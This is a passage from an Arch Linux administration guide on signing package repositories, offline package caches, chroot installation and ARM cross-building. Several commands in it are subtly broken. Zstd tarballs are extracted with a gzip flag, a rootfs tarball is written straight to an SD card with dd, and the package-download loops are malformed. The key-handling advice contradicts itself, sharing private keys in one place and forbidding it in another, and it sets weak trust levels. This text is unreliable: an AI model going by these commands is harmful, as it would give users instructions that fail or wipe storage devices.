gpg --edit-key packages@organization.com
# Trust as described above
```

#### Shared Private Key (Secure Distribution)

**Export private key (careful!):**
```bash
gpg --armor --export-secret-keys packages@organization.com > org-packages-private.asc
```

**Distribute securely:**
```bash
# Encrypt the private key
gpg --symmetric --armor --output org-packages-private.gpg.asc org-packages-private.asc

# Share encrypted file and password separately
```

**Import on other systems:**
```bash
gpg --import org-packages-private.asc
```

### Signing Workflow

#### Complete Signing Script

```bash
#!/bin/bash
# /usr/local/bin/sign-repo
# Complete repository signing workflow

REPO_DIR="$HOME/arch-repo"
REPO_NAME="myrepo"
KEY_ID="your-key-id"

error() {
    echo "Error: $1" >&2
    exit 1
}

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

main() {
    log "Starting repository signing process"
    
    cd "$REPO_DIR" || error "Repository directory not found"
    
    # Sign all unsigned packages
    log "Signing packages..."
    unsigned_count=0
    
    for pkg in *.pkg.tar.zst; do
        if [ ! -f "$pkg.asc" ]; then
            log "Signing: $pkg"
            
            if gpg --detach-sign --armor --default-key "$KEY_ID" "$pkg"; then
                ((unsigned_count++))
            else
                error "Failed to sign $pkg"
            fi
        fi
    done
    
    if [ $unsigned_count -gt 0 ]; then
        log "Signed $unsigned_count packages"
    else
        log "All packages already signed"
    fi
    
    # Rebuild and sign database
    log "Updating repository database..."
    repo-add "$REPO_NAME.db.tar.gz" *.pkg.tar.zst
    
    # Sign database files
    log "Signing database..."
    
    for file in "$REPO_NAME.db.tar.gz" "$REPO_NAME.files.tar.gz"; do
        if [ -f "$file" ]; then
            rm -f "$file.asc"
            
            if gpg --detach-sign --armor --default-key "$KEY_ID" "$file"; then
                log "Signed: $file"
            else
                error "Failed to sign $file"
            fi
        fi
    done
    
    # Verify all signatures
    log "Verifying signatures..."
    
    verify_count=0
    for sig in *.asc; do
        if gpg --verify "$sig" &>/dev/null; then
            ((verify_count++))
        else
            error "Signature verification failed: $sig"
        fi
    done
    
    log "Verified $verify_count signatures"
    
    log "Repository signing complete"
}

main "$@"
```

**Usage:**
```bash
chmod +x /usr/local/bin/sign-repo
sign-repo
```

### Client-Side Verification

#### Manual Signature Verification

**Verify package signature:**
```bash
gpg --verify package-name-1.0-1-x86_64.pkg.tar.zst.asc package-name-1.0-1-x86_64.pkg.tar.zst
```

**Output indicates:**
```
gpg: Signature made Wed Nov  1 10:00:00 2025 CST
gpg:                using RSA key ABCD1234ABCD1234
gpg: Good signature from "Your Name <you@example.com>"
```

#### Automatic Verification

**Pacman automatically verifies when:**
- Repository has `SigLevel = Required`
- Public key is imported and trusted
- Signature file exists alongside package

**Check verification:**
```bash
pacman -S myrepo/signed-package
# No signature errors means verification succeeded
```

### Troubleshooting

#### Signature Verification Failures

**Error:**
```
error: failed to verify the trust on imported keys
```

**Solution:**
```bash
# Import and trust the key
gpg --import public-key.asc
gpg --edit-key key-id
# Type: trust, then select 5 (ultimate)
```

#### Key Expiration

**Check key expiration:**
```bash
gpg --list-keys
```

**Extend expiration:**
```bash
gpg --edit-key your-key-id

gpg> expire
# Follow prompts to set new expiration

gpg> save
```

**Re-export and redistribute:**
```bash
gpg --armor --export you@example.com > updated-public-key.asc
```

#### Multiple Signers

**Repository signed by multiple keys:**
```ini
[multi-signed-repo]
SigLevel = Required
Server = file:///path/to/repo
```

**Import all signer keys:**
```bash
gpg --import signer1.asc
gpg --import signer2.asc
gpg --import signer3.asc
```

**Trust each one:**
```bash
gpg --edit-key signer1-id
# trust -> 5
gpg --edit-key signer2-id
# trust -> 5
```

### Best Practices

**Key security:**
- Protect private key with strong passphrase
- Store backup in secure location
- Never share private key
- Use separate key for repositories if possible

**Signature management:**
- Sign all packages in repository
- Sign database files
- Verify signatures before distribution
- Document signing process

**Distribution:**
- Distribute public key securely
- Use multiple distribution methods
- Include fingerprint for verification
- Document key ID and expiration

**Automation:**
- Automate signing process
- Include in build pipelines
- Verify before uploading
- Log all signing operations

**Maintenance:**
- Rotate keys periodically
- Archive old signatures
- Monitor key expiration
- Update trust settings as needed

### Advanced: Web of Trust

#### Build Trust Network

**Sign other keys:**
```bash
gpg --sign-key other-developers-key
```

**This creates web of trust where multiple developers verify each other.**

#### Distributed Repository Signing

**Multiple maintainers sign same repository:**
```bash
# Maintainer 1
gpg --detach-sign --armor --default-key maintainer1@org myrepo.db.tar.gz

# Maintainer 2  
gpg --detach-sign --armor --default-key maintainer2@org myrepo.db.tar.gz

# Store multiple signatures
mv myrepo.db.tar.gz.asc myrepo.db.tar.gz.asc.maintainer1
```

**Clients verify with any signature:**
```bash
gpg --verify myrepo.db.tar.gz.asc.maintainer1 myrepo.db.tar.gz
```

Repository signing provides cryptographic assurance that packages and repositories haven't been tampered with and come from trusted sources, essential for security in multi-system environments.

# Special Use Cases

## Offline Package Management

### Overview

Offline package management allows installing, updating, and managing packages without internet access. This is essential for systems without connectivity, air-gapped networks, organizational deployments, and emergency recovery situations.

### Preparation: Building Offline Resources

#### Collect Packages for Offline Use

**On system with internet:**
```bash
# Download packages without installing
pacman -Syuw
```

This syncs databases and downloads all available updates to cache without installing.

**Verify downloads:**
```bash
ls /var/cache/pacman/pkg/ | wc -l
```

#### Export Package Cache

**Create portable storage:**
```bash
# Create archive of cached packages
tar -czf arch-packages-$(date +%Y%m%d).tar.gz /var/cache/pacman/pkg/

# Or copy to removable media
cp -r /var/cache/pacman/pkg /mnt/usb-drive/pacman-cache
```

**Size consideration:**
```bash
# Check total size
du -sh /var/cache/pacman/pkg/
```

#### Create Offline Repository

**Best method for offline systems:**
```bash
# Setup as described in "Local Repository Setup"
mkdir -p ~/offline-repo
cp /var/cache/pacman/pkg/*.pkg.tar.zst ~/offline-repo/

# Create repository database
cd ~/offline-repo
repo-add offline.db.tar.gz *.pkg.tar.zst

# Create portable archive
tar -czf offline-repo.tar.gz ~/offline-repo/
```

### Transferring Packages to Offline System

#### USB Drive Transfer

**Prepare on online system:**
```bash
# Format USB drive
sudo mkfs.ext4 /dev/sdX1

# Mount USB
sudo mkdir -p /mnt/usb
sudo mount /dev/sdX1 /mnt/usb

# Copy packages
cp -r /var/cache/pacman/pkg /mnt/usb/

# Unmount
sudo umount /mnt/usb
```

**On offline system:**
```bash
# Mount USB
sudo mkdir -p /mnt/usb
sudo mount /dev/sdX1 /mnt/usb

# Verify packages
ls /mnt/usb/pkg/ | head -20
```

#### Network Transfer Before Disconnection

**Before going offline, download packages:**
```bash
# Download specific packages
pacman -Sw firefox vlc gimp

# Download with dependencies
pacman -Sw base-devel

# These are saved to /var/cache/pacman/pkg/
```

#### External Hard Drive

**Backup entire package cache:**
```bash
# On online system
rsync -av /var/cache/pacman/pkg/ /mnt/external-drive/pacman-pkg/

# Transfer to offline system
rsync -av /mnt/external-drive/pacman-pkg/ /var/cache/pacman/pkg/
```

### Installing from Local Cache

#### Using Pacman with Local Packages

**Install from cache:**
```bash
sudo pacman -U /var/cache/pacman/pkg/firefox-120.0-1-x86_64.pkg.tar.zst
```

**Install multiple packages:**
```bash
sudo pacman -U /var/cache/pacman/pkg/firefox-*.pkg.tar.zst \
                /var/cache/pacman/pkg/vlc-*.pkg.tar.zst
```

**Install all cached packages:**
```bash
sudo pacman -U /var/cache/pacman/pkg/*.pkg.tar.zst
```

**Wildcard caution:**
```bash
# This installs everything in cache
# May include multiple versions of same package
# Be selective when possible
```

#### Installing from Directory

**Copy packages to system:**
```bash
# Create offline packages directory
mkdir -p ~/offline-packages
cd ~/offline-packages

# Extract from USB
cp /mnt/usb/pkg/*.pkg.tar.zst .
```

**Install from directory:**
```bash
sudo pacman -U ~/offline-packages/*.pkg.tar.zst
```

### Using Offline Repository

#### Setup Offline Repository on Target System

**Extract repository archive:**
```bash
tar -xzf offline-repo.tar.gz -C ~
```

**Configure pacman:**
```bash
sudo nano /etc/pacman.conf
```

**Add offline repository:**
```ini
[offline]
SigLevel = Optional TrustAll
Server = file:///home/username/offline-repo
```

**Sync offline repository:**
```bash
pacman -Sy
```

**Verify repository:**
```bash
pacman -Sl offline
```

**Install from offline repository:**
```bash
sudo pacman -S offline/firefox offline/vlc
```

### Offline System Recovery

#### Recovery Scenario: No Internet During Update Failure

**Problem:** Update failed, internet unavailable for recovery.

**Solution:**

**1. Restore from cache:**
```bash
# Check what's in cache
ls /var/cache/pacman/pkg/

# Reinstall last known working version
sudo pacman -U /var/cache/pacman/pkg/broken-package-old-version.pkg.tar.zst
```

**2. If cache is empty:**
```bash
# Restore from USB with packages
sudo mount /dev/usb /mnt/usb
sudo pacman -U /mnt/usb/pkg/broken-package-*.pkg.tar.zst
```

**3. Use chroot recovery:**
```bash
# From live USB with packages
mount /dev/sda2 /mnt
mount /dev/usb /mnt/usb

# Setup offline repository in mounted system
cp /mnt/usb/pkg/*.pkg.tar.zst /mnt/var/cache/pacman/pkg/

# Chroot and recover
arch-chroot /mnt
pacman -U /var/cache/pacman/pkg/broken-package-*.pkg.tar.zst
```

### Offline Backup Strategy

#### Create Complete Offline System Backup

**Backup script:**
```bash
#!/bin/bash
# offline-backup.sh - Create complete offline backup

BACKUP_DIR="/mnt/backup"
DATE=$(date +%Y%m%d)

# 1. Backup package cache
echo "Backing up package cache..."
rsync -av /var/cache/pacman/pkg/ "$BACKUP_DIR/pacman-pkg/"

# 2. Create repository database
echo "Creating offline repository..."
cd "$BACKUP_DIR/pacman-pkg"
repo-add offline.db.tar.gz *.pkg.tar.zst

# 3. Backup system configuration
echo "Backing up system configuration..."
tar -czf "$BACKUP_DIR/etc-$DATE.tar.gz" /etc

# 4. Backup installed package list
echo "Backing up package list..."
pacman -Q > "$BACKUP_DIR/installed-packages-$DATE.txt"
pacman -Qe > "$BACKUP_DIR/explicit-packages-$DATE.txt"

# 5. Create recovery USB if path exists
if [ -d "/mnt/usb" ]; then
    echo "Creating recovery media..."
    cp -r "$BACKUP_DIR" /mnt/usb/system-backup-$DATE
fi

echo "Backup complete"
```

#### Backup PKGBUILD Files

**Keep AUR source files:**
```bash
# Archive all AUR build directories
tar -czf aur-sources-$(date +%Y%m%d).tar.gz ~/aur/

# Or specific packages
tar -czf critical-aur.tar.gz ~/aur/package1 ~/aur/package2
```

**Benefits:**
- Rebuild packages offline if needed
- Keep version history
- Reference for customizations

### Offline Dependency Resolution

#### Manual Dependency Analysis

**Find all dependencies for package:**
```bash
pacman -Si firefox | grep "Depends On"
```

**Create dependency list:**
```bash
#!/bin/bash
# get-deps.sh - Get all dependencies for package

get_all_deps() {
    local pkg="$1"
    pacman -Si "$pkg" | grep "Depends On" | sed 's/Depends On[[:space:]]*//'
}

# Usage
get_all_deps firefox | tr ' ' '\n' | while read dep; do
    echo "Package: $dep"
    get_all_deps "$dep"
done
```

**Download package and all dependencies:**
```bash
pacman -Sw firefox
# pacman automatically downloads all dependencies
```

#### Pre-Calculate Offline Installations

**Script to prepare packages:**
```bash
#!/bin/bash
# prepare-offline.sh - Prepare packages for offline installation

PACKAGES=(
    "base"
    "base-devel"
    "firefox"
    "vlc"
    "git"
)

OFFLINE_DIR="$HOME/offline-complete"
mkdir -p "$OFFLINE_DIR"

for pkg in "${PACKAGES[@]}"; do
    echo "Analyzing $pkg..."
    
    # Get package and all dependencies
    pacman -Sw "$pkg" --noconfirm 2>/dev/null
done

# Copy everything to offline directory
cp /var/cache/pacman/pkg/* "$OFFLINE_DIR/"

# Create repository
cd "$OFFLINE_DIR"
repo-add complete.db.tar.gz *.pkg.tar.zst

echo "Offline packages ready in $OFFLINE_DIR"
```

### Offline Updates

#### Plan Updates Offline

**Before going offline:**
```bash
# Check for available updates
checkupdates > ~/available-updates.txt

# Download all updates
pacman -Syu --print 2>/dev/null | while read line; do
    pacman -Sw "$line" --noconfirm 2>/dev/null
done
```

**Offline:**
```bash
# Install downloaded updates
sudo pacman -U /var/cache/pacman/pkg/*.pkg.tar.zst
```

#### Staged Offline Updates

**Create update packages by category:**
```bash
mkdir -p ~/offline-updates/{system,development,multimedia}

# Download by category
pacman -Sw base systemd linux > /dev/null
mv /var/cache/pacman/pkg/base*.pkg.tar.zst ~/offline-updates/system/

pacman -Sw gcc base-devel > /dev/null
mv /var/cache/pacman/pkg/{gcc,base-devel}*.pkg.tar.zst ~/offline-updates/development/

pacman -Sw vlc ffmpeg > /dev/null
mv /var/cache/pacman/pkg/{vlc,ffmpeg}*.pkg.tar.zst ~/offline-updates/multimedia/
```

### Documentation for Offline Environments

#### Create Reference Documentation

**System documentation:**
```bash
#!/bin/bash
# create-offline-docs.sh

DOCS_DIR="$HOME/offline-docs"
mkdir -p "$DOCS_DIR"

# 1. Pacman cheat sheet
cat > "$DOCS_DIR/pacman-commands.txt" << 'EOF'
# Offline Pacman Commands
pacman -U /path/to/package.pkg.tar.zst    # Install from file
pacman -Q                                  # List installed packages
pacman -Ql package                        # List package files
pacman -Qi package                        # Get package info
pacman -Qk package                        # Verify package files
pacman -Rns package                       # Remove package
EOF

# 2. Installed packages list
pacman -Q > "$DOCS_DIR/installed-packages.txt"

# 3. AUR package list
pacman -Qm > "$DOCS_DIR/aur-packages.txt"

# 4. System info
uname -a > "$DOCS_DIR/system-info.txt"
lsb_release -a >> "$DOCS_DIR/system-info.txt"

# 5. Package cache info
du -sh /var/cache/pacman/pkg/ > "$DOCS_DIR/cache-size.txt"

echo "Documentation created in $DOCS_DIR"
```

#### Recovery Procedures Document

```
OFFLINE RECOVERY PROCEDURES
===========================

1. No Network Access During Update Failure
   - Check /var/cache/pacman/pkg for previous versions
   - Use pacman -U to install from cache
   - Or restore from USB backup

2. Missing Package Dependencies
   - Download all dependencies from connected system
   - Copy to /var/cache/pacman/pkg
   - Install with pacman -U

3. Complete System Reinstall Offline
   - Boot from offline media with pacman
   - Extract package cache
   - Use pacman to install base system
   - Restore configuration from backup

4. AUR Package Rebuild Offline
   - Keep PKGBUILD files on backup media
   - Extract and modify PKGBUILD as needed
   - Run makepkg -si offline
```

### Automation Scripts

#### Offline Package Manager Wrapper

```bash
#!/bin/bash
# /usr/local/bin/offline-pac
# Wrapper for pacman in offline environments

# Check internet connectivity
is_online() {
    ping -c 1 -W 2 archlinux.org &>/dev/null
}

# Redirect to offline repo if no internet
main() {
    if ! is_online; then
        echo "No internet detected. Using offline mode."
        
        # Configure offline repository if needed
        if ! grep -q "\[offline\]" /etc/pacman.conf; then
            echo "Warning: No offline repository configured"
            echo "Use: offline-setup to configure"
        fi
    fi
    
    # Pass through to pacman
    pacman "$@"
}

main "$@"
```

### Best Practices

**Preparation:**
- Download packages regularly
- Maintain offline repository
- Backup PKGBUILD files
- Document system state

**Storage:**
- Use external hard drives for large caches
- Keep multiple USB backups
- Store in safe location
- Verify integrity periodically

**Recovery:**
- Test recovery procedures before needed
- Keep recovery media updated
- Document all procedures
- Train on offline operations

**Organization:**
- Organize packages by category
- Label backup media clearly
- Date all backups
- Maintain inventory

**Security:**
- Encrypt sensitive backups
- Verify package signatures when possible
- Secure backup storage
- Document access procedures

Offline package management ensures system maintenance capability even without internet access, critical for air-gapped systems, remote locations, and disaster recovery scenarios.

## Chroot Installations

### Overview

Chroot installations allow building and installing Arch Linux systems in isolated environments without affecting the running system. This is essential for system installation, recovery, testing, and creating customized system images.

### Understanding Chroot for Installation

#### What Makes Chroot Installation Useful

**Installation scenarios:**
- Initial system installation from live USB
- Installing to new partition or disk
- System recovery and repair
- Building custom system images
- Testing package combinations
- Creating containerized environments

**Key difference from running system:**
- Isolated filesystem root
- Separate package database
- Independent systemd services
- Own configuration files
- Isolated networking (optional)

### Prerequisite: Prepare Filesystems

#### Partition the Disk

**List available disks:**
```bash
lsblk
fdisk -l
```

**Create partitions:**
```bash
# Using fdisk
sudo fdisk /dev/sda

# Or using parted
sudo parted /dev/sda

# Or automated (dangerous - use carefully)
sudo cfdisk /dev/sda
```

**Typical partition layout:**
```
/dev/sda1  512MB   EFI partition (if UEFI)
/dev/sda2  50GB    Root partition
/dev/sda3  Rest    Home partition (optional)
```

#### Format Filesystems

**Format EFI partition (if UEFI):**
```bash
sudo mkfs.fat -F32 /dev/sda1
```

**Format root partition:**
```bash
sudo mkfs.ext4 /dev/sda2
```

**Format home partition (optional):**
```bash
sudo mkfs.ext4 /dev/sda3
```

#### Mount Filesystems

**Mount for installation:**
```bash
# Create mount point
sudo mkdir -p /mnt/arch-install
cd /mnt/arch-install

# Mount root
sudo mount /dev/sda2 .

# Create and mount boot
sudo mkdir -p boot
sudo mount /dev/sda1 boot

# Create and mount home (optional)
sudo mkdir -p home
sudo mount /dev/sda3 home
```

**Verify mounts:**
```bash
mount | grep /mnt/arch-install
```

### Bootstrap: Install Base System

#### Download and Verify Bootstrap Tarball

**On any Linux system:**
```bash
# Download bootstrap
wget https://archive.archlinux.org/iso/latest/arch/x86_64/archlinux-bootstrap-latest-x86_64.tar.zst

# Verify (optional but recommended)
wget https://archive.archlinux.org/iso/latest/arch/x86_64/archlinux-bootstrap-latest-x86_64.tar.zst.sha256
sha256sum -c archlinux-bootstrap-latest-x86_64.tar.zst.sha256
```

#### Extract Bootstrap

**Extract to mounted filesystem:**
```bash
sudo tar -xzf archlinux-bootstrap-latest-x86_64.tar.zst -C /mnt/arch-install/

# This creates /mnt/arch-install/root.x86_64/
```

#### Enter Bootstrap Environment

**Chroot into bootstrap:**
```bash
sudo /mnt/arch-install/root.x86_64/bin/arch-chroot /mnt/arch-install/root.x86_64/
```

**You're now inside the chroot environment:**
```
[root@archiso /]#
```

### Installing Base System

#### Initialize Pacman Keys

**Inside chroot:**
```bash
pacman-key --init
pacman-key --populate archlinux
```

This sets up GPG keys for package signature verification.

#### Update Pacman Database

```bash
pacman -Sy
```

#### Install Base System Packages

**Core installation:**
```bash
pacman -S base linux linux-firmware
```

**Recommended additions:**
```bash
pacman -S base linux linux-firmware \
          base-devel \
          grub efibootmgr \
          sudo nano vim \
          dhcpcd networkmanager
```

**Full desktop installation:**
```bash
pacman -S base linux linux-firmware \
          base-devel \
          grub efibootmgr \
          xorg-server plasma kde-applications \
          dhcpcd networkmanager \
          firefox
```

#### Generate Fstab

**Exit chroot temporarily:**
```bash
exit
```

**Generate fstab from mounted filesystems:**
```bash
sudo genfstab -U /mnt/arch-install/ >> /mnt/arch-install/etc/fstab
```

**Verify fstab:**
```bash
cat /mnt/arch-install/etc/fstab
```

**Re-enter chroot:**
```bash
sudo arch-chroot /mnt/arch-install/
```

### System Configuration

#### Set Timezone

**Inside chroot:**
```bash
ln -sf /usr/share/zoneinfo/America/New_York /etc/localtime
hwclock --systohc
```

#### Set Hostname

```bash
echo "my-hostname" > /etc/hostname
```

**Configure hosts file:**
```bash
cat >> /etc/hosts << EOF
127.0.0.1   localhost
::1         localhost
127.0.1.1   my-hostname
EOF
```

#### Configure Locale

**Edit locale configuration:**
```bash
nano /etc/locale.gen
```

**Uncomment desired locales:**
```
en_US.UTF-8 UTF-8
en_GB.UTF-8 UTF-8
```

**Generate locales:**
```bash
locale-gen
```

**Set default locale:**
```bash
echo "LANG=en_US.UTF-8" > /etc/locale.conf
```

#### Configure Network

**Using DHCP:**
```bash
systemctl enable dhcpcd
```

**Using NetworkManager:**
```bash
systemctl enable NetworkManager
```

**Or static IP:**
```bash
cat > /etc/systemd/network/20-static.network << EOF
[Match]
Name=eth0

[Network]
Address=192.168.1.100/24
Gateway=192.168.1.1
DNS=8.8.8.8
EOF

systemctl enable systemd-networkd
```

#### Create Root User Password

```bash
passwd
# Enter password twice
```

#### Create Regular User

```bash
useradd -m -G wheel -s /bin/bash username
passwd username

# Allow wheel group sudo access
sed -i 's/^# %wheel ALL=(ALL:ALL) ALL/%wheel ALL=(ALL:ALL) ALL/' /etc/sudoers
```

### Install and Configure Bootloader

#### GRUB (BIOS/UEFI)

**Install GRUB:**
```bash
pacman -S grub efibootmgr
```

**For BIOS:**
```bash
grub-install --target=i386-pc /dev/sda
```

**For UEFI:**
```bash
grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=GRUB
```

**Generate configuration:**
```bash
grub-mkconfig -o /boot/grub/grub.cfg
```

#### Systemd-boot (UEFI only)

**Install:**
```bash
bootctl install
```

**Create boot entries:**
```bash
mkdir -p /boot/loader/entries

cat > /boot/loader/entries/arch.conf << 'EOF'
title Arch Linux
linux /vmlinuz-linux
initrd /initramfs-linux.img
options root=/dev/sda2 rw
EOF
```

**Configure loader:**
```bash
cat > /boot/loader/loader.conf << EOF
default arch.conf
timeout 3
console-mode max
EOF
```

### Rebuild Initramfs

```bash
mkinitcpio -P
```

This creates initial ramdisk images for kernel boot.

### Exit and Unmount

#### Exit Chroot

```bash
exit
```

#### Unmount Filesystems

```bash
# Unmount in reverse order
sudo umount -R /mnt/arch-install/

# Verify unmounted
mount | grep /mnt/arch-install
# Should return nothing
```

### Boot Into New System

#### Reboot

```bash
sudo reboot
```

#### Select New System

- BIOS: Select drive/partition from boot menu
- UEFI: Select GRUB or systemd-boot from firmware menu
- Live USB: Remove USB, boot from new system drive

#### First Boot

**Login:**
```
Arch Linux 6.x.x-arch1-1 (tty1)
my-hostname login: username
Password: [enter password]
```

**Verify system:**
```bash
uname -a
pacman -Q
systemctl status
```

### Chroot Installation for Recovery

#### Scenario: Broken System Recovery

**Boot from live USB:**
```bash
# Mount existing system
sudo mount /dev/sda2 /mnt

# If EFI
sudo mount /dev/sda1 /mnt/boot/efi

# Enter chroot
arch-chroot /mnt
```

**Repair operations:**
```bash
# Reinstall packages
pacman -S base linux

# Rebuild bootloader
grub-install /dev/sda
grub-mkconfig -o /boot/grub/grub.cfg

# Rebuild initramfs
mkinitcpio -P

# Exit and reboot
exit
sudo reboot
```

### Custom System Images via Chroot

#### Create Minimal Image

**Build in chroot:**
```bash
# Setup directories
mkdir -p /mnt/custom-image/root
cd /mnt/custom-image

# Bootstrap
sudo tar -xzf archlinux-bootstrap-*.tar.zst

# Enter chroot
sudo arch-chroot root.x86_64/

# Install minimal packages
pacman -S base linux

# Exit
exit
```

**Create distributable image:**
```bash
tar -czf minimal-arch-image.tar.gz -C /mnt/custom-image root.x86_64/
```

#### Pre-Configure System in Chroot

**Install and configure applications:**
```bash
# Inside chroot
pacman -S firefox chromium vlc

# Configure services
systemctl enable NetworkManager
systemctl enable sshd

# Add users
useradd -m admin
```

**Create image with pre-configuration:**
```bash
# Exit and archive
exit
tar -czf preconfigured-image.tar.gz -C /mnt/custom-image root.x86_64/
```

### Troubleshooting Chroot Installations

#### Chroot Fails to Enter

**Error:**
```
bash: /mnt/arch-install/bin/bash: No such file or directory
```

**Solution:**
- Verify mount points are correct
- Check bootstrap tarball was extracted properly
- Use `arch-chroot` wrapper instead of plain `chroot`

#### Packages Won't Install

**Error:**
```
error: failed to prepare transaction
```

**Inside chroot:**
```bash
# Reinitialize keys
pacman-key --init
pacman-key --populate archlinux

# Refresh databases
pacman -Syy
```

#### Network Unavailable in Chroot

**Check networking:**
```bash
ping -c 3 archlinux.org
```

**If fails:**
```bash
# Configure DNS
echo "nameserver 8.8.8.8" > /etc/resolv.conf

# Or enable network in chroot setup
# When entering: arch-chroot -N /mnt/arch-install/
```

#### Bootloader Won't Install

**For UEFI systems:**
```bash
# Verify EFI partition is mounted
mount | grep efi

# Verify UEFI variables are available
ls -la /sys/firmware/efi/efivars/

# Re-attempt installation
grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=GRUB
```

### Best Practices

**Preparation:**
- Backup existing data
- Have recovery media available
- Document system configuration
- Test in VM first if possible

**During installation:**
- Don't skip key generation
- Use strong passwords
- Configure all necessary services
- Verify network connectivity

**Documentation:**
- Record hostname and users created
- Document custom configurations
- Keep PKGBUILD copies if using AUR
- Note any special settings

**Testing:**
- Verify bootloader works
- Test all configured services
- Check package installation
- Test user accounts

**Recovery:**
- Keep live USB updated
- Document recovery procedures
- Test recovery process periodically
- Maintain system backups

Chroot installations provide complete control over system creation and recovery, essential for Arch Linux administration and deployment.

## Cross-Architecture Scenarios

### Overview

Cross-architecture package management involves working with Arch Linux packages across different CPU architectures (x86_64, ARM, i686). This is essential for ARM development, maintaining legacy systems, supporting multiple hardware platforms, and developing for embedded devices.

### Arch Linux Architecture Support

#### Official Architectures

**x86_64 (primary):**
- 64-bit Intel/AMD processors
- Full repository support
- Most packages available
- Standard Arch Linux target

**ARM (aarch64):**
- 64-bit ARM (ARMv8+)
- Raspberry Pi 4/5, many SBCs
- Growing package support
- Arch Linux ARM project

**i686 (legacy):**
- 32-bit Intel/AMD processors
- Limited modern support
- Repository archived
- Mostly for legacy systems

**ARM (armv7h):**
- 32-bit ARM (ARMv7)
- Raspberry Pi 3 and earlier
- Limited package availability
- Arch Linux ARM

#### Check System Architecture

```bash
# Current system architecture
uname -m

# Kernel architecture
arch

# Check CPU flags
cat /proc/cpuinfo | grep flags

# Detailed architecture info
lscpu
```

### Multilib Support (x86_64 + i686)

#### Enabling Multilib on x86_64

**Edit pacman.conf:**
```bash
sudo nano /etc/pacman.conf
```

**Uncomment multilib section:**
```ini
[multilib]
Include = /etc/pacman.d/mirrorlist
```

**Sync databases:**
```bash
sudo pacman -Sy
```

**Verify multilib:**
```bash
pacman -Sl multilib | head -20
```

#### Installing 32-bit Packages

**Install 32-bit package:**
```bash
sudo pacman -S lib32-openssl
sudo pacman -S lib32-gcc-libs
```

**Query 32-bit packages:**
```bash
pacman -Ql lib32-gcc-libs
```

#### Use Cases for Multilib

**Gaming:**
- Wine (Windows compatibility)
- Steam and Proton
- Legacy games

**Development:**
- Cross-compilation for 32-bit targets
- Testing 32-bit code
- 32-bit development libraries

**Legacy applications:**
- Old 32-bit binaries
- Legacy software support

### ARM Development on x86_64

#### Cross-Compilation Setup

**Install cross-compilation toolchain:**
```bash
sudo pacman -S arm-none-eabi-gcc arm-none-eabi-binutils arm-none-eabi-newlib
```

**For Raspberry Pi (armv7h):**
```bash
sudo pacman -S arm-linux-gnueabihf-gcc
```

**For 64-bit ARM (aarch64):**
```bash
sudo pacman -S aarch64-linux-gnu-gcc
```

#### Create Cross-Compilation Environment

**PKGBUILD for ARM:**
```bash
# PKGBUILD for armv7h target

pkgname=my-arm-app
pkgver=1.0
pkgrel=1
arch=('armv7h')
makedepends=('arm-linux-gnueabihf-gcc')

build() {
    cd "$srcdir/$pkgname-$pkgver"
    arm-linux-gnueabihf-gcc -o my-app main.c
}

package() {
    install -Dm755 "$srcdir/$pkgname-$pkgver/my-app" "$pkgdir/usr/bin/my-app"
}
```

**Build:**
```bash
makepkg -s
```

**Transfer to ARM device:**
```bash
scp my-arm-app-1.0-1-armv7h.pkg.tar.zst user@raspberry-pi:/tmp/
```

#### Qemu Emulation

**Install qemu:**
```bash
sudo pacman -S qemu qemu-arch-extra
```

**Run ARM system emulation:**
```bash
# ARM 32-bit
qemu-system-arm -M virt -m 1024 -drive file=arm-image.img

# ARM 64-bit
qemu-system-aarch64 -M virt -m 1024 -drive file=aarch64-image.img
```

### Arch Linux ARM Systems

#### ARM Target Identification

**Common ARM targets:**
- aarch64 - 64-bit ARM (ARMv8+)
- armv7h - 32-bit ARM (ARMv7, optimized for hard float)
- armv6h - 32-bit ARM (ARMv6, Raspberry Pi 1/Zero)

**Verify on ARM device:**
```bash
uname -m
pacman -Q pacman
```

#### Package Management on ARM

**ARM systems use standard pacman:**
```bash
sudo pacman -Syu              # Update
sudo pacman -S package        # Install
sudo pacman -R package        # Remove
```

**ARM-specific considerations:**
- Slower compile times
- Limited package availability for older ARM versions
- Build from source more common (AUR)
- Resource constraints on embedded systems

#### Arch Linux ARM Installation

**For Raspberry Pi (aarch64):**
```bash
# Download image
wget http://os.archlinuxarm.org/os/ArchLinuxARM-rpi-aarch64-latest.tar.gz

# Flash to SD card
sudo dd if=ArchLinuxARM-rpi-aarch64-latest.tar.gz of=/dev/mmcblk0 bs=4M

# Boot and configure
```

### Building AUR Packages for Different Architectures

#### Architecture-Specific PKGBUILD

```bash
# PKGBUILD with architecture-specific handling

pkgname=my-multiarch-app
pkgver=1.0
pkgrel=1
arch=('x86_64' 'i686' 'aarch64')

build() {
    case "$CARCH" in
        x86_64)
            ./configure --prefix=/usr --enable-x86-64
            ;;
        i686)
            ./configure --prefix=/usr --enable-i686
            ;;
        aarch64)
            ./configure --prefix=/usr --enable-arm64
            ;;
    esac
    
    make
}

package() {
    make DESTDIR="$pkgdir" install
}
```

#### Build for Multiple Architectures

**Build script:**
```bash
#!/bin/bash
# build-multiarch.sh

ARCHITECTURES=('x86_64' 'i686' 'aarch64')

for arch in "${ARCHITECTURES[@]}"; do
    echo "Building for $arch..."
    
    # Set build environment
    export CARCH="$arch"
    
    # Clean build
    makepkg -Ccis --noconfirm
    
    # Move built package
    mv *.pkg.tar.zst "../packages/$arch/"
done
```

### Remote Package Building

#### Build for ARM on x86_64

**Set up cross-build environment:**
```bash
# In PKGBUILD
arch=('aarch64')

build() {
    # Use cross-compiler
    aarch64-linux-gnu-gcc -o binary main.c
}
```

**Build with cross tools:**
```bash
makepkg -s  # Installs aarch64-linux-gnu-gcc if needed
```

### Maintaining Multiple Architecture Repositories

#### Multi-Architecture Repository Structure

```bash
mkdir -p ~/arch-repo/{x86_64,i686,aarch64}

# Create separate databases
repo-add ~/arch-repo/x86_64/repo.db.tar.gz ~/arch-repo/x86_64/*.pkg.tar.zst
repo-add ~/arch-repo/i686/repo.db.tar.gz ~/arch-repo/i686/*.pkg.tar.zst
repo-add ~/arch-repo/aarch64/repo.db.tar.gz ~/arch-repo/aarch64/*.pkg.tar.zst
```

#### Configure for Multiple Architectures

**pacman.conf on x86_64:**
```ini
[myrepo-x86_64]
Server = file:///home/user/arch-repo/x86_64

[multilib]
Include = /etc/pacman.d/mirrorlist
```

**pacman.conf on ARM:**
```ini
[myrepo-aarch64]
Server = file:///home/user/arch-repo/aarch64
```

### Container/Virtual Machine Approach

#### Using Docker for Different Architectures
